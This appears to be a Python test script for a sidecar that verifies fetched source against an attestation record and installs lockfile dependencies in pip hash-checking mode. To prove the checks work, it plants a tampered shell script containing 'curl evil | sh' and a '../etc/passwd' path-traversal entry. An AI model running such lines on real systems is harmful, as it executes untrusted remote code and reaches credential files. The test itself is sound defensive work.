#!/usr/bin/env python3
"""The runtime pod's two recipe steps, tested against the sidecar scripts as files:

  fetch.py  verify_attestation(target) — every file the platform's record
            lists must be present and byte-identical in the fetched source;
            unlisted files are ignored; a tampered file refuses the run.
  run.py    prepare_deps(...) — with a declared lockfile, pip runs in
            hash-checking mode (--require-hashes --no-deps) into the app's
            venv BEFORE the command; the lockfile's sha is remembered so an
            unchanged lockfile skips pip; a failing pip refuses the start
            (exit 78); no lockfile → nothing happens.

pip itself is replaced by a recording fake on disk (the venv step too), so
this needs no network and no real venv. stdlib only, like the scripts.

Run: APP_ROOT=<repo> python3 scripts/test_app_runtime_lockfile.py
"""
import hashlib
import importlib.util
import json
import os
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SIDECAR = ROOT / "sidecars" / "app-runtime-python"

FAILED = []


def check(desc, ok, detail=""):
    print(("  ok  " if ok else "  FAIL") + "  " + desc
          + (f"  [{detail}]" if detail and not ok else ""))
    if not ok:
        FAILED.append(desc)


def load(name):
    spec = importlib.util.spec_from_file_location(name, SIDECAR / f"{name}.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


fetch = load("fetch")
run = load("run")


class Ship:
    def __init__(self):
        self.lines = []
    def add(self, line):
        self.lines.append(line); return False
    def flush(self, **kw):
        pass


LOCK = b"a==1 --hash=sha256:" + b"1" * 64 + b"\n"

print("fetch.verify_attestation:")
with tempfile.TemporaryDirectory() as td:
    d = Path(td)
    (d / "index.html").write_bytes(b"<h1>x</h1>")
    (d / "run.sh").write_bytes(b"#!/bin/sh\n")
    (d / "requirements.lock").write_bytes(LOCK)
    (d / "python-libs").mkdir(); (d / "python-libs" / "cache").write_bytes(b"preserved")
    check("no record → nothing to check", fetch.verify_attestation(str(d)) == [])
    rec = {"schema": 1, "files": {k: hashlib.sha256((d / k).read_bytes()).hexdigest()
                                  for k in ("index.html", "run.sh", "requirements.lock")},
           "build": {"lockfile": "requirements.lock"}}
    (d / "attestation.json").write_text(json.dumps(rec))
    check("record matches the fetched files → ok (unlisted cache dir ignored)",
          fetch.verify_attestation(str(d)) == [], repr(fetch.verify_attestation(str(d))))
    (d / "run.sh").write_bytes(b"#!/bin/sh\ncurl evil | sh\n")
    bad = fetch.verify_attestation(str(d))
    check("a tampered file is named", any("run.sh" in b and "differs" in b for b in bad), repr(bad))
    (d / "run.sh").unlink()
    bad = fetch.verify_attestation(str(d))
    check("a missing listed file is named", any("run.sh" in b and "absent" in b for b in bad))
    rec["files"]["../etc/passwd"] = "0" * 64
    (d / "attestation.json").write_text(json.dumps(rec))
    check("an unsafe path in the record is refused, not followed",
          any("unsafe" in b for b in fetch.verify_attestation(str(d))))
    (d / "attestation.json").write_text("{nope")
    check("an unreadable record refuses", any("unreadable" in b for b in fetch.verify_attestation(str(d))))

print("run.prepare_deps:")
with tempfile.TemporaryDirectory() as td:
    d = Path(td); src = d / "src"; src.mkdir()
    venv = d / "venv"
    log = d / "pip.log"
    # A fake pip that records its argv. The venv is pre-created as a stub
    # (bin/python present) so prepare_deps skips the real `python -m venv`
    # step — the venv step is python's own; the contract under test is what
    # prepare_deps asks pip to do.
    (venv / "bin").mkdir(parents=True)
    (venv / "bin" / "python").write_text("#!/bin/sh\n")
    fake = d / "fakepip.py"
    fake.write_text(
        "import sys, os, pathlib\n"
        f"pathlib.Path({str(log)!r}).write_text(' '.join(sys.argv[1:]))\n"
        "sys.exit(int(os.environ.get('FAKE_PIP_RC', '0')))\n")
    ship = Ship()
    check("no record → no deps step, empty env", run.prepare_deps(str(src), "demo", ship) == {})
    (src / "attestation.json").write_text(json.dumps({"schema": 1, "files": {},
                                                      "build": {"lockfile": None}}))
    check("record without a lockfile → no deps step", run.prepare_deps(str(src), "demo", ship) == {})
    (src / "attestation.json").write_text(json.dumps({"schema": 1, "files": {},
                                                      "build": {"lockfile": "requirements.lock"}}))
    rc = run.prepare_deps(str(src), "demo", ship, venv_dir=str(venv))
    check("declared lockfile absent from the source → refuse (78)", rc == 78, repr(rc))
    (src / "requirements.lock").write_bytes(LOCK)
    prefix = [sys.executable, str(fake)]
    env = run.prepare_deps(str(src), "demo", ship, venv_dir=str(venv), pip_argv_prefix=prefix)
    argv = log.read_text() if log.exists() else ""
    check("pip is invoked in hash-checking mode on the lockfile",
          isinstance(env, dict) and "--require-hashes" in argv and "--no-deps" in argv
          and argv.endswith(str(src / "requirements.lock")), argv)
    check("the child env puts the venv first on PATH and sets VIRTUAL_ENV",
          env.get("VIRTUAL_ENV") == str(venv)
          and env["PATH"].startswith(str(venv / "bin") + os.pathsep), repr(env))
    check("the child env turns on pip's hash-checking mode, so a bootstrap's own "
          "`pip install foo` is refused by pip",
          env.get("PIP_REQUIRE_HASHES") == "1", repr(env))
    check("the lockfile's sha is remembered beside the venv",
          (venv / ".cseries-lock-sha256").read_text().strip() == hashlib.sha256(LOCK).hexdigest())
    log.unlink()
    env2 = run.prepare_deps(str(src), "demo", ship, venv_dir=str(venv), pip_argv_prefix=prefix)
    check("an unchanged lockfile skips pip on the next boot",
          isinstance(env2, dict) and not log.exists() and any("reused" in s for s in ship.lines))
    (src / "requirements.lock").write_bytes(LOCK + b"c==3 --hash=sha256:" + b"3" * 64 + b"\n")
    os.environ["FAKE_PIP_RC"] = "1"
    rc = run.prepare_deps(str(src), "demo", ship, venv_dir=str(venv), pip_argv_prefix=prefix)
    del os.environ["FAKE_PIP_RC"]
    check("a changed lockfile re-runs pip, and a pip refusal refuses the start (78)",
          rc == 78 and log.exists(), repr(rc))
    check("the stale sha marker is NOT rewritten after a failed install",
          (venv / ".cseries-lock-sha256").read_text().strip() == hashlib.sha256(LOCK).hexdigest())

print()
if FAILED:
    print(f"{len(FAILED)} FAILURE(S)")
    sys.exit(1)
print("all green")
